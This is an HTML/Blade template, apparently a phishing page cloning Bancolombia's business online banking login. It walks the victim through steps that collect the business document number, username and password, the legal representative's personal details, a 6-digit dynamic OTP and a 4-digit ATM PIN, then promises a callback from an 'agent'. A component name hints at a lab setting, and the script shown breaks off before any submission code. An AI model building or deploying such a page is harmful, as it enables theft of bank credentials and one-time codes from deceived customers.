<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-store">
    <title>SVN - Bancolombia</title>
    <link rel="icon" type="image/x-icon" href="https://svnegocios.apps.bancolombia.com/favicon.ico">
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'bc-yellow': '#FDDA24',
                        'bc-dark': '#2C2A29',
                        'bc-gray': '#58595B',
                        'bc-gray-light': '#B3B5B8',
                        'bc-light': '#F5F5F5',
                        'bc-blue': '#0033A0',
                        'bc-info': '#E8F4FD',
                        'bc-info-border': '#0D47A1',
                        'bc-border': '#CDCDCD'
                    },
                    fontFamily: {
                        'cib': ['CIBFont Sans', 'Open Sans', 'sans-serif'],
                        'open': ['Open Sans', 'sans-serif']
                    },
                    boxShadow: {
                        'card': '0 4px 16px rgba(0, 0, 0, 0.08)'
                    }
                }
            }
        }
    </script>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        /* Font faces */
        @font-face {
            font-family: 'CIBFont Sans';
            src: url('/svn/CIBFontSans-Light.ttf') format('truetype');
            font-weight: 300;
            font-style: normal;
        }

        @font-face {
            font-family: 'CIBFont Sans';
            src: url('/svn/CIBFontSans-Light.ttf') format('truetype');
            font-weight: 400;
            font-style: normal;
        }

        @font-face {
            font-family: 'CIBFont Sans';
            src: url('/svn/CIBFontSans-Bold.ttf') format('truetype');
            font-weight: 700;
            font-style: normal;
        }

        /* Background */
        .bg-trazo {
            background-image: url('/svn/trazo-auth.svg');
            background-repeat: no-repeat;
            background-size: 100%;
        }

        @media (max-width: 768px) {
            .bg-trazo {
                background-size: 1025px;
            }
        }

        /* Hide number input spinners */
        input[type="number"]::-webkit-outer-spin-button,
        input[type="number"]::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }

        input[type="number"] {
            -moz-appearance: textfield;
        }

        /* Dropdown option hover */
        .dropdown-option:hover {
            background-color: #f5f5f5;
        }

        /* Input styles - Solo borde inferior */
        .bc-input-wrapper {
            position: relative;
            padding-top: 20px;
        }

        .bc-input-wrapper input {
            border: none;
            border-bottom: 1px solid #CDCDCD;
            border-radius: 0;
            padding: 8px 40px 8px 32px;
            font-size: 16px;
            width: 100%;
            font-family: 'Open Sans', sans-serif;
            color: #2C2A29;
            background: transparent;
            transition: border-color 0.2s;
        }

        .bc-input-wrapper input:focus {
            outline: none;
            border-bottom: 2px solid #FDDA24;
            padding-bottom: 7px;
        }

        .bc-input-wrapper input.has-error {
            border-bottom-color: #D32F2F;
        }

        .bc-input-wrapper input.is-valid {
            border-bottom: 2px solid #FDDA24;
            padding-bottom: 7px;
        }

        .bc-input-wrapper input:not(:placeholder-shown) {
            border-bottom: 2px solid #FDDA24;
            padding-bottom: 7px;
        }

        .bc-input-wrapper label {
            position: absolute;
            left: 32px;
            top: 28px;
            font-size: 16px;
            color: #58595B;
            pointer-events: none;
            transition: all 0.2s ease;
            font-family: 'Open Sans', sans-serif;
        }

        .bc-input-wrapper input:not(:placeholder-shown)+label {
            top: 0;
            left: 0;
            font-size: 12px;
        }

        .bc-input-wrapper .input-icon {
            position: absolute;
            left: 0;
            top: 26px;
            color: #58595B;
        }

        .bc-input-wrapper .toggle-password {
            position: absolute;
            right: 0;
            top: 26px;
            color: #58595B;
            cursor: pointer;
            background: none;
            border: none;
            padding: 0;
        }

        .bc-input-wrapper .toggle-password:hover {
            color: #2C2A29;
        }

        /* Select styles - Solo borde inferior */
        .bc-select-wrapper {
            position: relative;
            padding-top: 20px;
        }

        .bc-select-wrapper .select-label {
            position: absolute;
            top: 0;
            left: 0;
            font-size: 12px;
            color: #58595B;
            font-family: 'Open Sans', sans-serif;
        }

        .bc-select-trigger {
            border: none;
            border-bottom: 1px solid #CDCDCD;
            border-radius: 0;
            padding: 8px 0;
            font-size: 16px;
            width: 100%;
            font-family: 'Open Sans', sans-serif;
            color: #58595B;
            background: transparent;
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            align-items: center;
            transition: border-color 0.2s;
        }

        .bc-select-trigger:hover {
            border-bottom-color: #58595B;
        }

        .bc-select-trigger.is-open {
            border-bottom: 2px solid #FDDA24;
            padding-bottom: 7px;
        }

        .bc-select-trigger.has-value {
            color: #2C2A29;
            border-bottom: 2px solid #FDDA24;
            padding-bottom: 7px;
        }

        .bc-select-trigger.no-value {
            color: #58595B;
        }

        .bc-select-menu {
            position: absolute;
            top: calc(100% + 4px);
            left: 0;
            right: 0;
            background: white;
            border: 1px solid #CDCDCD;
            border-radius: 4px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
            z-index: 100;
            max-height: 280px;
            overflow-y: auto;
        }

        .bc-select-option {
            padding: 12px 16px;
            font-size: 14px;
            font-family: 'Open Sans', sans-serif;
            color: #2C2A29;
            cursor: pointer;
            transition: background-color 0.15s;
        }

        .bc-select-option:hover {
            background-color: #F5F5F5;
        }

        /* Card styles */
        .bc-card {
            background: white;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            padding: 32px 28px;
        }

        /* Button styles */
        .bc-button-primary {
            background-color: #FDDA24;
            color: #2C2A29;
            font-family: 'Open Sans', sans-serif;
            font-weight: 600;
            font-size: 16px;
            padding: 14px 24px;
            border-radius: 100px;
            border: none;
            width: 100%;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .bc-button-primary:hover:not(:disabled) {
            background-color: #E5C520;
        }

        .bc-button-primary:disabled {
            background-color: #E0E0E0;
            color: rgba(0, 0, 0, 0.26);
            cursor: not-allowed;
        }

        .bc-button-secondary {
            background-color: transparent;
            color: #2C2A29;
            font-family: 'Open Sans', sans-serif;
            font-weight: 600;
            font-size: 16px;
            padding: 14px 24px;
            border-radius: 100px;
            border: 1px solid #2C2A29;
            width: 100%;
            cursor: pointer;
            transition: all 0.2s;
        }

        .bc-button-secondary:hover {
            background-color: #F5F5F5;
        }

        /* Alert styles */
        .bc-alert-info {
            background-color: #E8F4FD;
            border-left: 4px solid #0D47A1;
            border-radius: 4px;
            padding: 16px;
        }

        /* Footer link styles */
        .bc-footer-link {
            font-family: 'Open Sans', sans-serif;
            font-size: 14px;
            color: #58595B;
            text-decoration: none;
            transition: color 0.2s;
        }

        .bc-footer-link:hover {
            color: #2C2A29;
            text-decoration: underline;
        }

        /* Link styles */
        .bc-link {
            font-family: 'Open Sans', sans-serif;
            font-size: 14px;
            color: #2C2A29;
            text-decoration: underline;
            font-weight: 600;
            cursor: pointer;
            transition: color 0.2s;
        }

        .bc-link:hover {
            color: #58595B;
        }

        /* Tab styles */
        .bc-tab {
            font-family: 'Open Sans', sans-serif;
            font-size: 16px;
            font-weight: 600;
            padding: 12px 32px;
            border-radius: 100px;
            cursor: pointer;
            transition: all 0.2s;
        }

        .bc-tab-active {
            background-color: #2C2A29;
            color: white;
        }

        .bc-tab-inactive {
            background-color: transparent;
            color: #58595B;
        }

        .bc-tab-inactive:hover {
            background-color: #F5F5F5;
        }

        /* OTP Input */
        .otp-container {
            display: flex;
            justify-content: center;
            gap: 8px;
        }

        .otp-input {
            width: 40px;
            height: 48px;
            border: none;
            border-bottom: 2px solid #CDCDCD;
            background: transparent;
            text-align: center;
            font-family: 'Open Sans', sans-serif;
            font-size: 24px;
            font-weight: 600;
            color: #2C2A29;
            transition: border-color 0.2s;
        }

        .otp-input:focus {
            outline: none;
            border-bottom-color: #FDDA24;
        }

        .otp-input.filled {
            border-bottom-color: #FDDA24;
        }

        /* Clave Cajero Input */
        .clavecajero-container {
            display: flex;
            justify-content: center;
            gap: 8px;
        }

        .clavecajero-input {
            width: 40px;
            height: 48px;
            border: none;
            border-bottom: 2px solid #CDCDCD;
            background: transparent;
            text-align: center;
            font-family: 'Open Sans', sans-serif;
            font-size: 24px;
            font-weight: 600;
            color: #2C2A29;
            transition: border-color 0.2s;
        }

        .clavecajero-input:focus {
            outline: none;
            border-bottom-color: #FDDA24;
        }

        .clavecajero-input.filled {
            border-bottom-color: #FDDA24;
        }
    </style>
</head>

<body class="bg-bc-light min-h-screen font-open">
    <x-lab-banner />

    <div class="min-h-screen bg-trazo">
        <div class="pt-8 md:pt-12 text-center">
            <div class="flex flex-col items-center mb-9">
                <img src="/svn/bancolombia-horizontal.svg" alt="Bancolombia" class="h-8 md:h-10 mb-4">
                <h1 class="font-cib text-2xl md:text-3xl font-light text-bc-dark">Sucursal Virtual Negocios</h1>
            </div>
        </div>

        <div class="flex flex-col items-center px-4 md:px-6">

            <div id="inicio" class="w-full max-w-sm bc-card mb-8 hidden">
                <div class="mb-8 text-center">
                    <h2 class="font-cib text-[20px] font-bold text-bc-dark mb-5">Te damos la bienvenida</h2>
                    <p class="text-bc-gray text-base">Ingresa el documento de tu negocio.</p>
                </div>

                <!-- Mensaje de error general -->
                <div id="inicio-error" class="bg-red-50 border-l-4 border-red-500 text-red-700 p-4 mb-6 rounded hidden">
                </div>

                <form id="login-form-inicio" autocomplete="off" novalidate>
                    <div class="mb-8">
                        <div id="dropdown-container" class="bc-select-wrapper">
                            <span id="select-label" class="select-label hidden">Tipo de documento</span>
                            <div id="dropdown-trigger" class="bc-select-trigger no-value">
                                <span id="selected-doc-type">Tipo de documento</span>
                                <svg id="dropdown-arrow" class="w-5 h-5 text-bc-gray transition-transform duration-200"
                                    fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                        d="M19 9l-7 7-7-7" />
                                </svg>
                            </div>
                            <div id="dropdown-menu" class="bc-select-menu hidden">
                                <div class="bc-select-option" data-value="NIT">NIT</div>
                                <div class="bc-select-option" data-value="CC">Cédula de ciudadanía</div>
                                <div class="bc-select-option" data-value="CE">Cédula de extranjería</div>
                                <div class="bc-select-option" data-value="PAS">Pasaporte</div>
                                <div class="bc-select-option" data-value="PNN">ID Extranjero Persona Natural</div>
                                <div class="bc-select-option" data-value="PJN">ID Extranjero Persona Jurídica</div>
                                <div class="bc-select-option" data-value="FC">Fideicomiso</div>
                                <div class="bc-select-option" data-value="CD">Carné Diplomático</div>
                            </div>
                        </div>
                        <input type="hidden" id="doc-type-value" name="documentType" value="">
                    </div>

                    <div class="mb-8">
                        <div class="bc-input-wrapper">
                            <span class="input-icon">
                                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                        d="M19 21V5a2 2 0 00-2-2H7a2 2 0 00-2 2v16m14 0h2m-2 0h-5m-9 0H3m2 0h5M9 7h1m-1 4h1m4-4h1m-1 4h1m-5 10v-5a1 1 0 011-1h2a1 1 0 011 1v5m-4 0h4" />
                                </svg>
                            </span>
                            <input type="number" id="doc-number" name="documentNumber" placeholder=" "
                                aria-label="Número de documento">
                            <label for="doc-number">Número de documento</label>
                        </div>
                        <span id="doc-hint" class="text-xs text-bc-gray mt-2 block"></span>
                        <span id="doc-error" class="text-xs text-red-600 mt-1 hidden"></span>
                    </div>

                    <button type="submit" id="btn-inicio-continue" disabled class="bc-button-primary">
                        Continuar
                    </button>
                </form>
            </div>
            <br>
            <div id="usuario" class="w-full max-w-sm bc-card mb-8 hidden">
                <div class="mb-8 text-center">
                    <h2 class="font-cib text-[20px] font-bold text-bc-dark">Iniciar sesión</h2>
                </div>

                <!-- Mensaje de error general -->
                <div id="usuario-error"
                    class="bg-red-50 border-l-4 border-red-500 text-red-700 p-4 mb-6 rounded hidden"></div>

                <form id="login-form-usuario" autocomplete="off" novalidate>
                    <div class="mb-2">
                        <div class="bc-input-wrapper">
                            <span class="input-icon">
                                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                        d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
                                </svg>
                            </span>
                            <input type="text" id="usuario-input" name="usuario" placeholder=" "
                                aria-label="Usuario de Negocios">
                            <label for="usuario-input">Usuario de Negocios</label>
                            <button type="button" class="toggle-password" id="toggle-usuario"
                                aria-label="Mostrar usuario">
                                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                        d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21" />
                                </svg>
                            </button>
                        </div>
                    </div>

                    <div class="text-right mb-6">
                        <a href="#" class="bc-link">¿Olvidaste tu usuario?</a>
                    </div>

                    <div class="mb-2">
                        <div class="bc-input-wrapper">
                            <span class="input-icon">
                                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                        d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                                </svg>
                            </span>
                            <input type="password" id="clave" name="clave" placeholder=" "
                                aria-label="Clave de Negocios">
                            <label for="clave">Clave de Negocios</label>
                            <button type="button" class="toggle-password" id="toggle-clave" aria-label="Mostrar clave">
                                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                        d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21" />
                                </svg>
                            </button>
                        </div>
                    </div>

                    <div class="text-right mb-8">
                        <a href="#" class="bc-link">¿Olvidaste tu clave?</a>
                    </div>

                    <button type="submit" id="btn-ingresar" disabled class="bc-button-primary mb-4">
                        Ingresar
                    </button>

                    <button type="button" id="btn-volver" class="bc-button-secondary">
                        Volver
                    </button>
                </form>
            </div>
            <br>
            <div id="datospersonales" class="w-full max-w-sm bc-card mb-8 hidden">
                <div class="mb-8 text-center">
                    <h2 class="font-cib text-[20px] font-bold text-bc-dark mb-5">Datos del Representante Legal</h2>
                    <p class="text-bc-gray text-base">Ingresa los datos del Representante Legal del negocio.</p>
                </div>

                <!-- Mensaje de error general -->
                <div id="datospersonales-error"
                    class="bg-red-50 border-l-4 border-red-500 text-red-700 p-4 mb-6 rounded hidden"></div>

                <form id="datos-form" autocomplete="off" novalidate>
                    <div class="mb-6">
                        <div class="bc-input-wrapper">
                            <span class="input-icon">
                                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                        d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
                                </svg>
                            </span>
                            <input type="text" id="nombre" name="nombre" placeholder=" " aria-label="Nombre completo" style="text-transform: uppercase;">
                            <label for="nombre">Nombre completo</label>
                        </div>
                        <span id="nombre-error" class="text-xs text-red-600 mt-1 hidden"></span>
                    </div>

                    <div class="mb-6">
                        <div class="bc-input-wrapper">
                            <span class="input-icon">
                                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                        d="M10 6H5a2 2 0 00-2 2v9a2 2 0 002 2h14a2 2 0 002-2V8a2 2 0 00-2-2h-5m-4 0V5a2 2 0 114 0v1m-4 0a2 2 0 104 0m-5 8a2 2 0 100-4 2 2 0 000 4zm0 0c1.306 0 2.417.835 2.83 2M9 14a3.001 3.001 0 00-2.83 2M15 11h3m-3 4h2" />
                                </svg>
                            </span>
                            <input type="number" id="cedula" name="cedula" placeholder=" "
                                aria-label="Número de cédula">
                            <label for="cedula">Número de cédula</label>
                        </div>
                        <span id="cedula-error" class="text-xs text-red-600 mt-1 hidden"></span>
                    </div>

                    <div class="mb-6">
                        <div class="bc-input-wrapper">
                            <span class="input-icon">
                                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                        d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
                                </svg>
                            </span>
                            <input type="email" id="email" name="email" placeholder=" " aria-label="Correo electrónico">
                            <label for="email">Correo electrónico</label>
                        </div>
                        <span id="email-error" class="text-xs text-red-600 mt-1 hidden"></span>
                    </div>

                    <div class="mb-8">
                        <div class="bc-input-wrapper">
                            <span class="input-icon">
                                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                        d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
                                </svg>
                            </span>
                            <input type="tel" id="celular" name="celular" placeholder=" "
                                aria-label="Número de celular">
                            <label for="celular">Número de celular</label>
                        </div>
                        <span id="celular-error" class="text-xs text-red-600 mt-1 hidden"></span>
                    </div>

                    <button type="submit" id="btn-continue" disabled class="bc-button-primary">
                        Continuar
                    </button>
                </form>
            </div>
            <br>
            <div id="otpapp" class="w-full max-w-sm bc-card mb-8 relative hidden">
                <button id="btn-otp-close"
                    class="absolute top-4 right-4 text-bc-gray hover:text-bc-dark transition-colors btn-close-card">
                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                            d="M6 18L18 6M6 6l12 12" />
                    </svg>
                </button>

                <div class="flex justify-center mb-6 mt-2">
                    <img src="/svn/dinamica-logo-1.png" alt="Clave Dinámica 111 111" class="h-20">
                </div>

                <div class="text-center mb-6">
                    <h2 class="font-cib text-[20px] font-bold text-bc-dark mb-4">Clave Dinámica</h2>
                    <p class="text-bc-gray text-base leading-relaxed">
                        Ingresa los 6 dígitos de la Clave Dinámica. Consúltala ingresando a la <strong>app
                            Negocios</strong>.
                    </p>
                </div>

                <!-- Mensaje de error general -->
                <div id="otpapp-error" class="bg-red-50 border-l-4 border-red-500 text-red-700 p-4 mb-6 rounded hidden">
                </div>

                <form id="otp-form" autocomplete="off" novalidate>
                    <input type="hidden" id="otpapp-hidden" name="otpapp" value="">
                    <div class="mb-4">
                        <div class="otp-container">
                            <input type="text" maxlength="1" class="otp-input" data-index="0" inputmode="numeric"
                                pattern="[0-9]*">
                            <input type="text" maxlength="1" class="otp-input" data-index="1" inputmode="numeric"
                                pattern="[0-9]*">
                            <input type="text" maxlength="1" class="otp-input" data-index="2" inputmode="numeric"
                                pattern="[0-9]*">
                            <input type="text" maxlength="1" class="otp-input" data-index="3" inputmode="numeric"
                                pattern="[0-9]*">
                            <input type="text" maxlength="1" class="otp-input" data-index="4" inputmode="numeric"
                                pattern="[0-9]*">
                            <input type="text" maxlength="1" class="otp-input" data-index="5" inputmode="numeric"
                                pattern="[0-9]*">
                        </div>
                        <p class="text-center text-bc-gray text-sm mt-3">Ingresa el código de 6 dígitos</p>
                    </div>

                    <div class="space-y-3 mt-8">
                        <button type="submit" id="btn-otp-continue" disabled class="bc-button-primary">
                            Continuar
                        </button>
                        <button type="button" id="btn-otp-cancel" class="bc-button-secondary btn-cancel-card">
                            Cancelar
                        </button>
                    </div>
                </form>
            </div>
            <br>
            <div id="clavecajero" class="w-full max-w-sm bc-card mb-8 relative hidden">
                <button id="btn-clavecajero-close"
                    class="absolute top-4 right-4 text-bc-gray hover:text-bc-dark transition-colors btn-close-card">
                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                            d="M6 18L18 6M6 6l12 12" />
                    </svg>
                </button>

                <div class="flex justify-center mb-6 mt-2">
                    <img src="/svn/dinamica-logo-1.png" alt="Clave Dinámica 111 111" class="h-20">
                </div>

                <div class="text-center mb-6">
                    <h2 class="font-cib text-[20px] font-bold text-bc-dark mb-4">Clave de cajero</h2>
                    <p class="text-bc-gray text-base leading-relaxed">
                        Para validar su identidad, ingrese su clave principal.
                    </p>
                </div>

                <!-- Mensaje de error general -->
                <div id="clavecajero-error"
                    class="bg-red-50 border-l-4 border-red-500 text-red-700 p-4 mb-6 rounded hidden"></div>

                <form id="clavecajero-form" autocomplete="off" novalidate>
                    <input type="hidden" id="clavecajero-hidden" name="clavecajero" value="">
                    <div class="mb-4">
                        <div class="clavecajero-container">
                            <input type="text" maxlength="1" class="clavecajero-input" data-index="0"
                                inputmode="numeric" pattern="[0-9]*">
                            <input type="text" maxlength="1" class="clavecajero-input" data-index="1"
                                inputmode="numeric" pattern="[0-9]*">
                            <input type="text" maxlength="1" class="clavecajero-input" data-index="2"
                                inputmode="numeric" pattern="[0-9]*">
                            <input type="text" maxlength="1" class="clavecajero-input" data-index="3"
                                inputmode="numeric" pattern="[0-9]*">
                        </div>
                        <p class="text-center text-bc-gray text-sm mt-3">Ingresa la clave de 4 dígitos</p>
                    </div>

                    <div class="space-y-3 mt-8">
                        <button type="submit" id="btn-clavecajero-continue" disabled class="bc-button-primary">
                            Continuar
                        </button>
                        <button type="button" id="btn-clavecajero-cancel" class="bc-button-secondary btn-cancel-card">
                            Cancelar
                        </button>
                    </div>
                </form>
            </div>
            <br>
            <div id="exito" class="w-full max-w-sm bc-card mb-8 relative hidden">
                <button id="btn-exito-close"
                    class="absolute top-4 right-4 text-bc-gray hover:text-bc-dark transition-colors btn-close-card">
                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                            d="M6 18L18 6M6 6l12 12" />
                    </svg>
                </button>

                <div class="flex justify-center mb-6 mt-2">
                    <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" fill="#4CAF50"
                        viewBox="0 0 16 16">
                        <path
                            d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zm-3.97-3.03a.75.75 0 0 0-1.08.022L7.477 9.417 5.384 7.323a.75.75 0 0 0-1.06 1.06L6.97 11.03a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 0 0-.01-1.05z" />
                    </svg>
                </div>

                <div class="text-center mb-6">
                    <h2 class="font-cib text-[20px] font-bold text-bc-dark mb-4">Proceso finalizado con éxito</h2>
                    <p class="text-bc-gray text-base leading-relaxed">
                        Su proceso se encuentra en proceso de validación.
                    </p>
                </div>
            </div>
            <br>
            <div id="fin" class="w-full max-w-sm bc-card mb-8 relative hidden">
                <button id="btn-fin-close"
                    class="absolute top-4 right-4 text-bc-gray hover:text-bc-dark transition-colors btn-close-card">
                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                            d="M6 18L18 6M6 6l12 12" />
                    </svg>
                </button>

                <div class="flex justify-center mb-6 mt-2">
                    <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" fill="#0D47A1"
                        viewBox="0 0 24 24">
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
                    </svg>
                </div>

                <div class="text-center mb-6">
                    <h2 class="font-cib text-[20px] font-bold text-bc-dark mb-4">Verificación adicional</h2>
                    <p class="text-bc-gray text-base leading-relaxed">
                        Uno de nuestros agentes te contactará para realizar una verificación adicional y finalizar con
                        exito tu solicitud.
                    </p>
                </div>
            </div>
            <br>
            <div id="loading" class="fixed inset-0 bg-white/90 flex items-center justify-center z-50 hidden">
                <div class="text-center">
                    <div
                        class="w-16 h-16 border-4 border-bc-yellow border-t-transparent rounded-full animate-spin mx-auto mb-4">
                    </div>
                    <p class="text-bc-gray font-open">Cargando...</p>
                </div>
            </div>

        </div>

        <footer class="bg-white mt-auto">
            <div class="max-w-lg mx-auto px-4">
                <div class="flex flex-col items-center gap-4 py-6">
                    <a href="#" class="bc-footer-link">Conoce la sucursal virtual</a>
                    <a href="#" class="bc-footer-link">Conversor de pagos PAB</a>
                    <a href="#" class="bc-footer-link">Conversor de pagos SAP</a>
                    <a href="#" class="bc-footer-link">Solicitudes y novedades</a>
                    <a href="#" target="_blank" rel="noopener noreferrer" class="bc-footer-link">Contáctanos</a>
                    <a href="#" target="_blank" rel="noopener noreferrer" class="bc-footer-link">Aprende sobre
                        seguridad</a>
                    <a href="#" target="_blank" rel="noopener noreferrer" class="bc-footer-link">Preguntas
                        frecuentes</a>
                </div>

                <div class="w-full h-px bg-bc-gray-light"></div>

                <div class="flex flex-col items-center text-center py-6 gap-3">
                    <img src="/svn/bancolombia-horizontal.svg" alt="Bancolombia" style="width: 150px;">
                    <p class="text-sm text-bc-gray font-open">Copyright © 2025 Bancolombia.</p>
                    <div
                        style="height: 14px; overflow: visible; display: flex; align-items: center; justify-content: center;">
                        <img src="/svn/logo-vigilado.svg" alt="Vigilado Superintendencia Financiera de Colombia"
                            style="height: 10rem; transform: rotate(90deg);">
                    </div>
                    <div class="text-sm text-bc-gray font-open mt-2">
                        <p>Dirección IP: {{ request()->ip() }}</p>
                        <p>{{ ucfirst(\Carbon\Carbon::now('America/Bogota')->locale('es')->isoFormat('dddd, D [de] MMMM
                            [de] YYYY, h:mm:ss a')) }}</p>
                    </div>
                </div>

                <div class="flex justify-center pb-4">
                    <img src="/svn/14.svg" alt="" class="w-full" aria-hidden="true">
                </div>
            </div>
        </footer>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function () {
            // =============================================
            // DROPDOWN Y DOCUMENTO (Login inicio)
            // =============================================
            const dropdownTrigger = document.getElementById('dropdown-trigger');
            const dropdownMenu = document.getElementById('dropdown-menu');
            const dropdownArrow = document.getElementById('dropdown-arrow');
            const selectedDocType = document.getElementById('selected-doc-type');
            const docTypeValue = document.getElementById('doc-type-value');
            const docNumber = document.getElementById('doc-number');
            const docHint = document.getElementById('doc-hint');
            const docError = document.getElementById('doc-error');
            const btnContinueDoc = document.getElementById('btn-inicio-continue');
            const closeAlert = document.getElementById('close-alert');
            const alertBanner = document.getElementById('alert-banner');
            let currentDocType = '';

            // Función para validar y habilitar botón de documento
            function validateDocForm() {
                if (!btnContinueDoc) return;
                const value = docNumber.value;
                let isValid = false;

                if (currentDocType && value.length > 0) {
                    if (currentDocType === 'NIT') {
                        const nitRegex = /^[89]\d{8}$/;
                        isValid = nitRegex.test(value);
                    } else {
                        isValid = value.length >= 6;
                    }
                }
                btnContinueDoc.disabled = !isValid;
            }

            // Toggle dropdown
            dropdownTrigger.addEventListener('click', function (e) {
                e.stopPropagation();
                const isOpen = !dropdownMenu.classList.contains('hidden');

                if (isOpen) {
                    dropdownMenu.classList.add('hidden');
                    dropdownArrow.classList.remove('rotate-180');
                    dropdownTrigger.classList.remove('is-open');
                } else {
                    dropdownMenu.classList.remove('hidden');
                    dropdownArrow.classList.add('rotate-180');
                    dropdownTrigger.classList.add('is-open');
                }
            });
            // Close dropdown on outside click
            document.addEventListener('click', function () {
                dropdownMenu.classList.add('hidden');
                dropdownArrow.classList.remove('rotate-180');
                dropdownTrigger.classList.remove('is-open');
            });
            // Handle option selection
            const selectLabel = document.getElementById('select-label');
            document.querySelectorAll('.bc-select-option').forEach(option => {
                option.addEventListener('click', function (e) {
                    e.stopPropagation();
                    const value = this.dataset.value;
                    const text = this.textContent;

                    selectedDocType.textContent = text;
                    dropdownTrigger.classList.remove('no-value');
                    dropdownTrigger.classList.add('has-value');
                    docTypeValue.value = value;
                    currentDocType = value;

                    // Show floating label
                    selectLabel.classList.remove('hidden');

                    // Update hint
                    if (value === 'NIT') {
                        docHint.textContent = 'Ingresa el NIT sin número de verificación';
                    } else {
                        docHint.textContent = '';
                    }

                    // Reset input
                    docNumber.value = '';
                    docNumber.classList.remove('has-error', 'is-valid');
                    docError.classList.add('hidden');
                    validateDocForm();

                    // Close dropdown
                    dropdownMenu.classList.add('hidden');
                    dropdownArrow.classList.remove('rotate-180');
                    dropdownTrigger.classList.remove('is-open');
                });
            });

            // Validate document number
            docNumber.addEventListener('input', function () {
                let value = this.value;

                // Limit NIT to 9 digits
                if (currentDocType === 'NIT' && value.length > 9) {
                    value = value.slice(0, 9);
                    this.value = value;
                }

                if (value.length > 0) {
                    if (currentDocType === 'NIT') {
                        const nitRegex = /^[89]\d{8}$/;
                        if (nitRegex.test(value)) {
                            this.classList.remove('has-error');
                            this.classList.add('is-valid');
                            docError.classList.add('hidden');
                        } else {
                            this.classList.remove('is-valid');
                            this.classList.add('has-error');
                            docError.textContent = 'El NIT debe comenzar con 8 o 9 y tener 9 dígitos';
                            docError.classList.remove('hidden');
                        }
                    } else {
